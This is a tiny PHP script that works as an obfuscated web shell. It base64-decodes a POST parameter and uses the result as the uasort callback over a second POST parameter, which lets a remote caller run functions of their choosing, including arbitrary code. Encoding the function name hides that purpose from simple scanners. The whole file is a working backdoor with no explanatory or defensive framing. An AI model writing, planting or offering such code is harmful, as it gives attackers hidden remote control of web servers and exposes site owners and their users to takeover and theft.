<?php 
$act = $_POST['act'];
$payload = array('test',$_POST['faith']);
uasort($payload, base64_decode($act));
?>